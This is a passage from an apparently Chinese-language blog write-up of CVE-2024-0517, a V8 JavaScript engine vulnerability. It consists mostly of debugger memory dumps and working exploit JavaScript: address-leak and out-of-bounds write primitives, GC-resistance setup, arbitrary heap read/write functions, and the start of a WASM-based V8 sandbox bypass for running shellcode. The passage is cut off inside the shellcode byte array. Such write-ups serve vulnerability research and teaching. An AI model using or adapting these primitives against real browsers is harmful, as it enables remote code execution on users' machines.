ReadOnlySpace: <span class="comment">#a: 0x25550030add1 &lt;JSArray[1]&gt; (const data field 1), location: in-object</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x255500202a29 &lt;FixedArray[19]&gt; &#123;</span><br><span class="line">           0: 0x2555000006c1 &lt;the_hole_value&gt;</span><br><span class="line">           1: 0x255500000061 &lt;undefined&gt;</span><br><span class="line">        2-18: 0x2555000006c1 &lt;the_hole_value&gt;</span><br><span class="line"> &#125;</span><br><span class="line">0x25550030a5f5: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 20</span><br><span class="line"> - inobject properties: 2</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x25550030a5c5 &lt;Map[20](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x25550030a5ed &lt;Cell value= 0&gt;</span><br><span class="line"> - instance descriptors (own) <span class="comment">#2: 0x25550030a7c9 &lt;DescriptorArray[2]&gt;</span></span><br><span class="line"> - prototype: 0x2555001a3f69 &lt;ClassParent map = 0x25550030a59d&gt;</span><br><span class="line"> - constructor: 0x25550019ad25 &lt;JSFunction ClassParent (sfi = 0x255500199ecd)&gt;</span><br><span class="line"> - dependent code: 0x25550030ab1d &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">------- x array ----------</span><br><span class="line">DebugPrint: 0x25550030ad9d: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x25550018eea5 &lt;Map[16](PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x25550018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x25550030adc1 &lt;FixedDoubleArray[1]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 8</span><br><span class="line"> - properties: 0x2555000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x255500000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x255500025d29 &lt;AccessorInfo name= 0x255500000cf1 &lt;String[6]: #length&gt;, data= 0x255500000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x25550030adc1 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: -858993459</span><br><span class="line"> &#125;</span><br><span class="line">0x25550018eea5: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x25550018ee65 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2555000009e1 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x25550018edb1 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x25550018eecd &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x255500000db5 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_ELEMENTS) -&gt; 0x25550018eee5 &lt;Map[16](HOLEY_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x25550018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x25550018e56d &lt;JSFunction Array (sfi = 0x2555001c6155)&gt;</span><br><span class="line"> - dependent code: 0x2555000006b5 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">-------- a array -----------</span><br><span class="line">DebugPrint: 0x25550030add1: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x25550018ee25 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x25550018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x25550030adc1 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x2555000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x255500000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x255500025d29 &lt;AccessorInfo name= 0x255500000cf1 &lt;String[6]: #length&gt;, data= 0x255500000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x25550030adc1 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line"> &#125;</span><br><span class="line">0x25550018ee25: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x25550018ede5 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x2555000009e1 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x25550018edb1 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x25550018ee4d &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x255500000db5 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x25550018ee65 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x25550018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x25550018e56d &lt;JSFunction Array (sfi = 0x2555001c6155)&gt;</span><br><span class="line"> - dependent code: 0x2555000006b5 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br></pre></td></tr></table></figure>

<p>我们可以发现两者的elements是相同的，这就是因为在分配折叠之前发生了GC进一步导致了x数组的elements被覆盖为了a数组的elements，之后我们查看一下gdb里面的内存</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">----- this ------</span><br><span class="line">0x25550030adac: 0x0030a5f5      0x000006a5      0x00202a29      0x0030ad9d</span><br><span class="line">0x25550030adbc: 0x0030add1      0x00000829      0x00000002      0x9999999a</span><br><span class="line">0x25550030adcc: 0x3ff19999      0x0018ee25      0x000006a5      0x0030adc1</span><br><span class="line">0x25550030addc: 0x00000002      0x001a3d89      0x001a3d89      0x00000565</span><br><span class="line">0x25550030adec: 0x00000028      0x0030ae41      0x00000000      0x0030ae6d</span><br><span class="line">0x25550030adfc: 0x000002f2      0x0000001a      0x0000000c      0x00199d65</span><br><span class="line">0x25550030ae0c: 0x00000e19      0x00000268      0x00000002      0x00000004</span><br><span class="line">0x25550030ae1c: 0x000002f2      0x00000000</span><br></pre></td></tr></table></figure>

<p>我们可以发现其内存布局如下</p>
<p><img src="/2025/01/18/CVE-2024-0517/cve-2024-0517.png" alt="cve-2024-0517"></p>
<h3 id="初始OOB"><a href="#初始OOB" class="headerlink" title="初始OOB"></a>初始OOB</h3><p>有了上述的结论之后我们就可以实现最初版本的OOB了。</p>
<h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addrof_tmp</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    x[<span class="number">0</span>] = obj;</span><br><span class="line">    f64[<span class="number">0</span>] = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> u32[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="写入地址"><a href="#写入地址" class="headerlink" title="写入地址"></a>写入地址</h4><p>在写入的时候我们需要创建一个double类型的数组，然后对其进行操作</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> rwarr = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">2.2</span>];</span><br><span class="line">dogc_flag = <span class="literal">true</span>;</span><br><span class="line"><span class="title function_">dogc</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> addr_a = <span class="title function_">addrof_tmp</span>(a);</span><br><span class="line"><span class="keyword">let</span> addr_rwarr = <span class="title function_">addrof_tmp</span>(rwarr);</span><br><span class="line">x[<span class="number">5</span>] = <span class="number">0x10000</span>;</span><br><span class="line"><span class="keyword">let</span> offset = (addr_rwarr - addr_a) + <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">if</span> ((offset % <span class="number">8</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">    offset += <span class="number">4</span>;</span><br><span class="line">&#125;</span><br><span class="line">offset = offset / <span class="number">8</span>;</span><br><span class="line">offset += <span class="number">1</span>;</span><br><span class="line">offset -= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> mark  = offset;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(rwarr);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;mark is ==&gt; &quot;</span> , mark);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a [mark] is ==&gt; &quot;</span>, <span class="title function_">f2i</span>(a[mark]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a[2] is ==&gt; &quot;</span>, <span class="title function_">f2i</span>(a[<span class="number">2</span>]).<span class="title function_">toString</span>(<span class="number">16</span>));</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上述代码是计算<code>rwarr</code>数组的<code>elements</code>和 a数组数据区起始位置的偏移，运行上述代码然后我们使用gdb可以查看到如下内存布局</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">----------代码运行结果--------------</span><br><span class="line">DebugPrint: 0x3d0b0030ae8d: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x3d0b0018ee25 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d0b0018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d0b0030ae7d &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 65536</span><br><span class="line"> - properties: 0x3d0b000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x3d0b00000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d0b00025d29 &lt;AccessorInfo name= 0x3d0b00000cf1 &lt;String[6]: #length&gt;, data= 0x3d0b00000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d0b0030ae7d &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line"> &#125;</span><br><span class="line">0x3d0b0018ee25: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3d0b0018ede5 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x3d0b000009e1 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x3d0b0018edb1 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x3d0b0018ee4d &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x3d0b00000db5 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3d0b0018ee65 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3d0b0018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3d0b0018e56d &lt;JSFunction Array (sfi = 0x3d0b001c6155)&gt;</span><br><span class="line"> - dependent code: 0x3d0b000006b5 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x3d0b0030aee5: [JSArray] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - map: 0x3d0b0018ee25 &lt;Map[16](PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3d0b0018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3d0b0030af69 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x3d0b000006a5 &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x3d0b00000cf1: [String] <span class="keyword">in</span> ReadOnlySpace: <span class="comment">#length: 0x3d0b00025d29 &lt;AccessorInfo name= 0x3d0b00000cf1 &lt;String[6]: #length&gt;, data= 0x3d0b00000061 &lt;undefined&gt;&gt; (const accessor descriptor), location: descriptor</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3d0b0030af69 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">         1-2: 2.2</span><br><span class="line"> &#125;</span><br><span class="line">0x3d0b0018ee25: [Map] <span class="keyword">in</span> OldSpace</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x3d0b0018ede5 &lt;Map[16](HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x3d0b000009e1 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x3d0b0018edb1 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x3d0b0018ee4d &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x3d0b00000db5 &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x3d0b0018ee65 &lt;Map[16](HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x3d0b0018e845 &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x3d0b0018e56d &lt;JSFunction Array (sfi = 0x3d0b001c6155)&gt;</span><br><span class="line"> - dependent code: 0x3d0b000006b5 &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">mark is ==&gt;  13</span><br><span class="line">a [mark] is ==&gt;  60030af69</span><br><span class="line">a[2] is ==&gt;  200000030ae7d</span><br><span class="line"></span><br><span class="line">--------------gdb查看----------------</span><br><span class="line">pwndbg&gt; x/40wx 0x3d0b0030ae7d-1</span><br><span class="line">0x3d0b0030ae7c: 0x00000829      0x00000002         0x0030aee5      0x3ff19999 <span class="comment"># 0</span></span><br><span class="line">0x3d0b0030ae8c: 0x0018ee25      0x000006a5 <span class="comment"># 1     0x0030ae7d      0x00020000 # 2</span></span><br><span class="line">0x3d0b0030ae9c: 0x001a3049      0x001a3049 <span class="comment"># 3     0x0018ee25      0x000006a5 # 4</span></span><br><span class="line">0x3d0b0030aeac: 0x0030af49      0x00000006 <span class="comment"># 5     0x00001495      0x0030aea5 # 6</span></span><br><span class="line">0x3d0b0030aebc: 0x00000000      0x000006b5 <span class="comment"># 7     0x00000001      0x00000001 # 8</span></span><br><span class="line">0x3d0b0030aecc: 0x0030a801      0x0030a6b1 <span class="comment"># 9     0x000006a5      0x0030af89 # 10</span></span><br><span class="line">0x3d0b0030aedc: 0x0030afdd      0x0030afed <span class="comment"># 11    0x0018ee25      0x000006a5 # 12</span></span><br><span class="line">0x3d0b0030aeec: 0x0030af69      0x00000006 <span class="comment"># 13    0x00000565      0x00000026</span></span><br><span class="line">0x3d0b0030aefc: 0x000006c1      0x00000061      0x000006c1      0x000006c1</span><br><span class="line">0x3d0b0030af0c: 0x000006c1      0x000006c1      0x000006c1      0x000006c1</span><br></pre></td></tr></table></figure>

<p>我们可以数一下rwarr数组的elements距离起始位置的偏移刚好是我们所计算的mark值是一样的，因此我们可以通过此方式来获取和修改<code>rwarr</code>数组elements所指向的区域。</p>
<p>下面是实现该功能的函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">where, what</span>) &#123;</span><br><span class="line">    b64[<span class="number">0</span>] = <span class="number">0n</span>;</span><br><span class="line">    f64[<span class="number">0</span>] = a[mark];</span><br><span class="line">    <span class="keyword">if</span> (u32[<span class="number">0</span>] == <span class="number">0x6</span>) &#123;</span><br><span class="line">        u32[<span class="number">1</span>] = where - <span class="number">8</span>;</span><br><span class="line">        a[mark] = f64[<span class="number">0</span>];</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (u32[<span class="number">1</span>] == <span class="number">0x6</span>) &#123;</span><br><span class="line">        u32[<span class="number">0</span>] = where-<span class="number">8</span>;</span><br><span class="line">        a[mark] = f64[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">      rwarr[<span class="number">0</span>] = what;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="获取GC抗性"><a href="#获取GC抗性" class="headerlink" title="获取GC抗性"></a>获取GC抗性</h4><p>由于V8垃圾回收机制的存在，我们需要分配若干对象并利用垃圾回收机制将其迁移至老生代内存空间，随后使用初始原语对这些对象进行篡改，并最后将保留在新生代的对象进行修复。</p>
<p>下面是完成该步骤的代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> changer = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>]</span><br><span class="line"><span class="keyword">let</span> leaker  = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>]</span><br><span class="line"><span class="keyword">let</span> holder  = &#123;<span class="attr">p1</span>:<span class="number">0x1</span>, <span class="attr">p2</span>: <span class="number">0x1</span>, <span class="attr">p3</span>:<span class="number">0x1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> changer_addr = <span class="title function_">addrof_tmp</span>(changer);</span><br><span class="line"><span class="keyword">let</span> leaker_addr = <span class="title function_">addrof_tmp</span>(leaker);</span><br><span class="line"><span class="keyword">let</span> holder_addr = <span class="title function_">addrof_tmp</span>(holder);</span><br><span class="line">u32[<span class="number">0</span>] = holder_addr;</span><br><span class="line">u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line"><span class="keyword">let</span> holder_addr_64 = f64[<span class="number">0</span>];</span><br><span class="line">u32[<span class="number">0</span>] = leaker_addr;</span><br><span class="line">u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(changer_addr + <span class="number">0x8</span>, f64[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">// %DebugPrint(changer);</span></span><br><span class="line"><span class="title function_">write</span>(leaker_addr + <span class="number">0x8</span>, holder_addr_64);</span><br><span class="line"><span class="comment">// %DebugPrint(leaker);</span></span><br><span class="line">x.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">a.<span class="property">length</span> = <span class="number">0</span>;</span><br><span class="line">rwarr.<span class="property">length</span> = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>这里就是获取GC对抗的代码，下面我们就可以开始书写真正的读写原语了。</p>
<h3 id="最终OOB"><a href="#最终OOB" class="headerlink" title="最终OOB"></a>最终OOB</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">v8h_read64</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = leaker[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(ret);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">v8h_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    holder_addr_64 = changer[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(addr)-<span class="number">8</span>;</span><br><span class="line">    u32[<span class="number">1</span>] = <span class="number">0xc</span>;</span><br><span class="line">    changer[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    f64[<span class="number">0</span>] = leaker[<span class="number">0</span>];</span><br><span class="line">    u32[<span class="number">0</span>] = <span class="title class_">Number</span>(value);</span><br><span class="line">    leaker[<span class="number">0</span>] = f64[<span class="number">0</span>];</span><br><span class="line">    changer[<span class="number">0</span>] = holder_addr_64;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    holder.<span class="property">p2</span> = obj;</span><br><span class="line">    <span class="comment">// %DebugPrint(leaker);</span></span><br><span class="line">    <span class="comment">// %DebugPrint(holder);</span></span><br><span class="line">    <span class="keyword">let</span> ret = leaker[<span class="number">1</span>];</span><br><span class="line">    holder.<span class="property">p2</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">f2i</span>(ret) &amp; <span class="number">0xffffffffn</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="绕过V8沙箱"><a href="#绕过V8沙箱" class="headerlink" title="绕过V8沙箱"></a>绕过V8沙箱</h3><p>我们需要创建两个WASM实例来绕过V8沙箱，一个用于存储shellcode，另一个用于篡改指向shellcode的64位指针</p>
<p>首先我们来看第一段wasm实例</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> shell_wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">17</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">133</span>, <span class="number">1</span>, <span 